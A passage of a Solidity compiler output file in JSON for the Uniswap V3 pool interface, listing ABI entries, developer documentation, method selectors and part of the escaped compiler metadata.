								{
									"internalType": "uint128",
									"name": "",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "mint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "index",
									"type": "uint256"
								}
							],
							"name": "observations",
							"outputs": [
								{
									"internalType": "uint32",
									"name": "blockTimestamp",
									"type": "uint32"
								},
								{
									"internalType": "int56",
									"name": "tickCumulative",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityCumulativeX128",
									"type": "uint160"
								},
								{
									"internalType": "bool",
									"name": "initialized",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint32[]",
									"name": "secondsAgos",
									"type": "uint32[]"
								}
							],
							"name": "observe",
							"outputs": [
								{
									"internalType": "int56[]",
									"name": "tickCumulatives",
									"type": "int56[]"
								},
								{
									"internalType": "uint160[]",
									"name": "secondsPerLiquidityCumulativeX128s",
									"type": "uint160[]"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "bytes32",
									"name": "key",
									"type": "bytes32"
								}
							],
							"name": "positions",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "_liquidity",
									"type": "uint128"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthInside0LastX128",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthInside1LastX128",
									"type": "uint256"
								},
								{
									"internalType": "uint128",
									"name": "tokensOwed0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "tokensOwed1",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "protocolFees",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "token0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "token1",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint8",
									"name": "feeProtocol0",
									"type": "uint8"
								},
								{
									"internalType": "uint8",
									"name": "feeProtocol1",
									"type": "uint8"
								}
							],
							"name": "setFeeProtocol",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "slot0",
							"outputs": [
								{
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								},
								{
									"internalType": "uint16",
									"name": "observationIndex",
									"type": "uint16"
								},
								{
									"internalType": "uint16",
									"name": "observationCardinality",
									"type": "uint16"
								},
								{
									"internalType": "uint16",
									"name": "observationCardinalityNext",
									"type": "uint16"
								},
								{
									"internalType": "uint8",
									"name": "feeProtocol",
									"type": "uint8"
								},
								{
									"internalType": "bool",
									"name": "unlocked",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								}
							],
							"name": "snapshotCumulativesInside",
							"outputs": [
								{
									"internalType": "int56",
									"name": "tickCumulativeInside",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityInsideX128",
									"type": "uint160"
								},
								{
									"internalType": "uint32",
									"name": "secondsInside",
									"type": "uint32"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "bool",
									"name": "zeroForOne",
									"type": "bool"
								},
								{
									"internalType": "int256",
									"name": "amountSpecified",
									"type": "int256"
								},
								{
									"internalType": "uint160",
									"name": "sqrtPriceLimitX96",
									"type": "uint160"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "swap",
							"outputs": [
								{
									"internalType": "int256",
									"name": "amount0",
									"type": "int256"
								},
								{
									"internalType": "int256",
									"name": "amount1",
									"type": "int256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int16",
									"name": "wordPosition",
									"type": "int16"
								}
							],
							"name": "tickBitmap",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "tickSpacing",
							"outputs": [
								{
									"internalType": "int24",
									"name": "",
									"type": "int24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "ticks",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "liquidityGross",
									"type": "uint128"
								},
								{
									"internalType": "int128",
									"name": "liquidityNet",
									"type": "int128"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthOutside0X128",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthOutside1X128",
									"type": "uint256"
								},
								{
									"internalType": "int56",
									"name": "tickCumulativeOutside",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityOutsideX128",
									"type": "uint160"
								},
								{
									"internalType": "uint32",
									"name": "secondsOutside",
									"type": "uint32"
								},
								{
									"internalType": "bool",
									"name": "initialized",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "token0",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "token1",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"details": "The pool interface is broken up into many smaller pieces",
						"events": {
							"Burn(address,int24,int24,uint128,uint256,uint256)": {
								"details": "Does not withdraw any fees earned by the liquidity position, which must be withdrawn via #collect",
								"params": {
									"amount": "The amount of liquidity to remove",
									"amount0": "The amount of token0 withdrawn",
									"amount1": "The amount of token1 withdrawn",
									"owner": "The owner of the position for which liquidity is removed",
									"tickLower": "The lower tick of the position",
									"tickUpper": "The upper tick of the position"
								}
							},
							"Collect(address,address,int24,int24,uint128,uint128)": {
								"details": "Collect events may be emitted with zero amount0 and amount1 when the caller chooses not to collect fees",
								"params": {
									"amount0": "The amount of token0 fees collected",
									"amount1": "The amount of token1 fees collected",
									"owner": "The owner of the position for which fees are collected",
									"tickLower": "The lower tick of the position",
									"tickUpper": "The upper tick of the position"
								}
							},
							"CollectProtocol(address,address,uint128,uint128)": {
								"params": {
									"amount0": "The amount of token1 protocol fees that is withdrawn",
									"recipient": "The address that receives the collected protocol fees",
									"sender": "The address that collects the protocol fees"
								}
							},
							"Flash(address,address,uint256,uint256,uint256,uint256)": {
								"params": {
									"amount0": "The amount of token0 that was flashed",
									"amount1": "The amount of token1 that was flashed",
									"paid0": "The amount of token0 paid for the flash, which can exceed the amount0 plus the fee",
									"paid1": "The amount of token1 paid for the flash, which can exceed the amount1 plus the fee",
									"recipient": "The address that received the tokens from flash",
									"sender": "The address that initiated the swap call, and that received the callback"
								}
							},
							"IncreaseObservationCardinalityNext(uint16,uint16)": {
								"details": "observationCardinalityNext is not the observation cardinality until an observation is written at the index just before a mint/swap/burn.",
								"params": {
									"observationCardinalityNextNew": "The updated value of the next observation cardinality",
									"observationCardinalityNextOld": "The previous value of the next observation cardinality"
								}
							},
							"Initialize(uint160,int24)": {
								"details": "Mint/Burn/Swap cannot be emitted by the pool before Initialize",
								"params": {
									"sqrtPriceX96": "The initial sqrt price of the pool, as a Q64.96",
									"tick": "The initial tick of the pool, i.e. log base 1.0001 of the starting price of the pool"
								}
							},
							"Mint(address,address,int24,int24,uint128,uint256,uint256)": {
								"params": {
									"amount": "The amount of liquidity minted to the position range",
									"amount0": "How much token0 was required for the minted liquidity",
									"amount1": "How much token1 was required for the minted liquidity",
									"owner": "The owner of the position and recipient of any minted liquidity",
									"sender": "The address that minted the liquidity",
									"tickLower": "The lower tick of the position",
									"tickUpper": "The upper tick of the position"
								}
							},
							"SetFeeProtocol(uint8,uint8,uint8,uint8)": {
								"params": {
									"feeProtocol0New": "The updated value of the token0 protocol fee",
									"feeProtocol0Old": "The previous value of the token0 protocol fee",
									"feeProtocol1New": "The updated value of the token1 protocol fee",
									"feeProtocol1Old": "The previous value of the token1 protocol fee"
								}
							},
							"Swap(address,address,int256,int256,uint160,uint128,int24)": {
								"params": {
									"amount0": "The delta of the token0 balance of the pool",
									"amount1": "The delta of the token1 balance of the pool",
									"liquidity": "The liquidity of the pool after the swap",
									"recipient": "The address that received the output of the swap",
									"sender": "The address that initiated the swap call, and that received the callback",
									"sqrtPriceX96": "The sqrt(price) of the pool after the swap, as a Q64.96",
									"tick": "The log base 1.0001 of price of the pool after the swap"
								}
							}
						},
						"kind": "dev",
						"methods": {
							"burn(int24,int24,uint128)": {
								"details": "Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0Fees must be collected separately via a call to #collect",
								"params": {
									"amount": "How much liquidity to burn",
									"tickLower": "The lower tick of the position for which to burn liquidity",
									"tickUpper": "The upper tick of the position for which to burn liquidity"
								},
								"returns": {
									"amount0": "The amount of token0 sent to the recipient",
									"amount1": "The amount of token1 sent to the recipient"
								}
							},
							"collect(address,int24,int24,uint128,uint128)": {
								"details": "Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity. Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.",
								"params": {
									"amount0Requested": "How much token0 should be withdrawn from the fees owed",
									"amount1Requested": "How much token1 should be withdrawn from the fees owed",
									"recipient": "The address which should receive the fees collected",
									"tickLower": "The lower tick of the position for which to collect fees",
									"tickUpper": "The upper tick of the position for which to collect fees"
								},
								"returns": {
									"amount0": "The amount of fees collected in token0",
									"amount1": "The amount of fees collected in token1"
								}
							},
							"collectProtocol(address,uint128,uint128)": {
								"params": {
									"amount0Requested": "The maximum amount of token0 to send, can be 0 to collect fees in only token1",
									"amount1Requested": "The maximum amount of token1 to send, can be 0 to collect fees in only token0",
									"recipient": "The address to which collected protocol fees should be sent"
								},
								"returns": {
									"amount0": "The protocol fee collected in token0",
									"amount1": "The protocol fee collected in token1"
								}
							},
							"factory()": {
								"returns": {
									"_0": "The contract address"
								}
							},
							"fee()": {
								"returns": {
									"_0": "The fee"
								}
							},
							"feeGrowthGlobal0X128()": {
								"details": "This value can overflow the uint256"
							},
							"feeGrowthGlobal1X128()": {
								"details": "This value can overflow the uint256"
							},
							"flash(address,uint256,uint256,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallbackCan be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling with 0 amount{0,1} and sending the donation amount(s) from the callback",
								"params": {
									"amount0": "The amount of token0 to send",
									"amount1": "The amount of token1 to send",
									"data": "Any data to be passed through to the callback",
									"recipient": "The address which will receive the token0 and token1 amounts"
								}
							},
							"increaseObservationCardinalityNext(uint16)": {
								"details": "This method is no-op if the pool already has an observationCardinalityNext greater than or equal to the input observationCardinalityNext.",
								"params": {
									"observationCardinalityNext": "The desired minimum number of observations for the pool to store"
								}
							},
							"initialize(uint160)": {
								"details": "Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value",
								"params": {
									"sqrtPriceX96": "the initial sqrt price of the pool as a Q64.96"
								}
							},
							"liquidity()": {
								"details": "This value has no relationship to the total liquidity across all ticks"
							},
							"maxLiquidityPerTick()": {
								"details": "This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool",
								"returns": {
									"_0": "The max amount of liquidity per tick"
								}
							},
							"mint(address,int24,int24,uint128,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends on tickLower, tickUpper, the amount of liquidity, and the current price.",
								"params": {
									"amount": "The amount of liquidity to mint",
									"data": "Any data that should be passed through to the callback",
									"recipient": "The address for which the liquidity will be created",
									"tickLower": "The lower tick of the position in which to add liquidity",
									"tickUpper": "The upper tick of the position in which to add liquidity"
								},
								"returns": {
									"amount0": "The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback",
									"amount1": "The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback"
								}
							},
							"observations(uint256)": {
								"details": "You most likely want to use #observe() instead of this method to get an observation as of some amount of time ago, rather than at a specific index in the array.",
								"params": {
									"index": "The element of the observations array to fetch"
								},
								"returns": {
									"blockTimestamp": "The timestamp of the observation, Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp, Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp, Returns initialized whether the observation has been initialized and the values are safe to use"
								}
							},
							"observe(uint32[])": {
								"details": "To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick, you must call it with secondsAgos = [3600, 0].The time weighted average tick represents the geometric time weighted average price of the pool, in log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.",
								"params": {
									"secondsAgos": "From how long ago each cumulative tick and liquidity value should be returned"
								},
								"returns": {
									"secondsPerLiquidityCumulativeX128s": "Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block timestamp",
									"tickCumulatives": "Cumulative tick values as of each `secondsAgos` from the current block timestamp"
								}
							},
							"positions(bytes32)": {
								"params": {
									"key": "The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper"
								},
								"returns": {
									"_liquidity": "The amount of liquidity in the position, Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke, Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke, Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke, Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke"
								}
							},
							"protocolFees()": {
								"details": "Protocol fees will never exceed uint128 max in either token"
							},
							"setFeeProtocol(uint8,uint8)": {
								"params": {
									"feeProtocol0": "new protocol fee for token0 of the pool",
									"feeProtocol1": "new protocol fee for token1 of the pool"
								}
							},
							"slot0()": {
								"returns": {
									"sqrtPriceX96": "The current price of the pool as a sqrt(token1/token0) Q64.96 value tick The current tick of the pool, i.e. according to the last tick transition that was run. This value may not always be equal to SqrtTickMath.getTickAtSqrtRatio(sqrtPriceX96) if the price is on a tick boundary. observationIndex The index of the last oracle observation that was written, observationCardinality The current maximum number of observations stored in the pool, observationCardinalityNext The next maximum number of observations, to be updated when the observation. feeProtocol The protocol fee for both tokens of the pool. Encoded as two 4 bit values, where the protocol fee of token1 is shifted 4 bits and the protocol fee of token0 is the lower 4 bits. Used as the denominator of a fraction of the swap fee, e.g. 4 means 1/4th of the swap fee. unlocked Whether the pool is currently locked to reentrancy"
								}
							},
							"snapshotCumulativesInside(int24,int24)": {
								"details": "Snapshots must only be compared to other snapshots, taken over a period for which a position existed. I.e., snapshots cannot be compared if a position is not held for the entire period between when the first snapshot is taken and the second snapshot is taken.",
								"params": {
									"tickLower": "The lower tick of the range",
									"tickUpper": "The upper tick of the range"
								},
								"returns": {
									"secondsInside": "The snapshot of seconds per liquidity for the range",
									"secondsPerLiquidityInsideX128": "The snapshot of seconds per liquidity for the range",
									"tickCumulativeInside": "The snapshot of the tick accumulator for the range"
								}
							},
							"swap(address,bool,int256,uint160,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback",
								"params": {
									"amountSpecified": "The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)",
									"data": "Any data to be passed through to the callback",
									"recipient": "The address to receive the output of the swap",
									"sqrtPriceLimitX96": "The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this value after the swap. If one for zero, the price cannot be greater than this value after the swap",
									"zeroForOne": "The direction of the swap, true for token0 to token1, false for token1 to token0"
								},
								"returns": {
									"amount0": "The delta of the balance of token0 of the pool, exact when negative, minimum when positive",
									"amount1": "The delta of the balance of token1 of the pool, exact when negative, minimum when positive"
								}
							},
							"tickSpacing()": {
								"details": "Ticks can only be used at multiples of this value, minimum of 1 and always positive e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ... This value is an int24 to avoid casting even though it is always positive.",
								"returns": {
									"_0": "The tick spacing"
								}
							},
							"ticks(int24)": {
								"params": {
									"tick": "The tick to look up"
								},
								"returns": {
									"liquidityGross": "the total amount of position liquidity that uses the pool either as tick lower or tick upper, liquidityNet how much liquidity changes when the pool price crosses the tick, feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0, feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1, tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick, secondsOutside the seconds spent on the other side of the tick from the current tick, initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false. Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0. In addition, these values are only relative and must be used only in comparison to previous snapshots for a specific position."
								}
							},
							"token0()": {
								"returns": {
									"_0": "The token contract address"
								}
							},
							"token1()": {
								"returns": {
									"_0": "The token contract address"
								}
							}
						},
						"title": "The interface for a Uniswap V3 Pool",
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"burn(int24,int24,uint128)": "a34123a7",
							"collect(address,int24,int24,uint128,uint128)": "4f1eb3d8",
							"collectProtocol(address,uint128,uint128)": "85b66729",
							"factory()": "c45a0155",
							"fee()": "ddca3f43",
							"feeGrowthGlobal0X128()": "f3058399",
							"feeGrowthGlobal1X128()": "46141319",
							"flash(address,uint256,uint256,bytes)": "490e6cbc",
							"increaseObservationCardinalityNext(uint16)": "32148f67",
							"initialize(uint160)": "f637731d",
							"liquidity()": "1a686502",
							"maxLiquidityPerTick()": "70cf754a",
							"mint(address,int24,int24,uint128,bytes)": "3c8a7d8d",
							"observations(uint256)": "252c09d7",
							"observe(uint32[])": "883bdbfd",
							"positions(bytes32)": "514ea4bf",
							"protocolFees()": "1ad8b03b",
							"setFeeProtocol(uint8,uint8)": "8206a4d1",
							"slot0()": "3850c7bd",
							"snapshotCumulativesInside(int24,int24)": "a38807f2",
							"swap(address,bool,int256,uint160,bytes)": "128acb08",
							"tickBitmap(int16)": "5339c296",
							"tickSpacing()": "d0c93a7c",
							"ticks(int24)": "f30dba93",
							"token0()": "0dfe1681",
							"token1()": "d21220a7"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Burn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"name\":\"Collect\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"name\":\"CollectProtocol\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"paid0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"paid1\",\"type\":\"uint256\"}],\"name\":\"Flash\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"observationCardinalityNextOld\",\"type\":\"uint16\"},{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"observationCardinalityNextNew\",\"type\":\"uint16\"}],\"name\":\"IncreaseObservationCardinalityNext\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"Initialize\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Mint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol0Old\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol1Old\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol0New\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol1New\",\"type\":\"uint8\"}],\"name\":\"SetFeeProtocol\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"amount0\",\"type\":\"int256\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"amount1\",\"type\":\"int256\"},{\"indexed\":false,\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"liquidity\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"Swap\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount0Requested\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1Requested\",\"type\":\"uint128\"}],\"name\":\"collect\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint128\",\"name\":\"amount0Requested\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1Requested\",\"type\":\"uint128\"}],\"name\":\"collectProtocol\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"factory\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fee\",\"outputs\":[{\"internalType\":\"uint24\",\"name\":\"\",\"type\":\"uint24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeGrowthGlobal0X128\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeGrowthGlobal1X128\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"flash\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"observationCardinalityNext\",\"type\":\"uint16\"}],\"name\":\"increaseObservationCardinalityNext\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"}],\"name\":\"initialize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidity\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLiquidityPerTick\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"mint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"observations\",\"outputs\":[{\"internalType\":\"uint32\",\"name\":\"blockTimestamp\",\"type\":\"uint32\"},{\"internalType\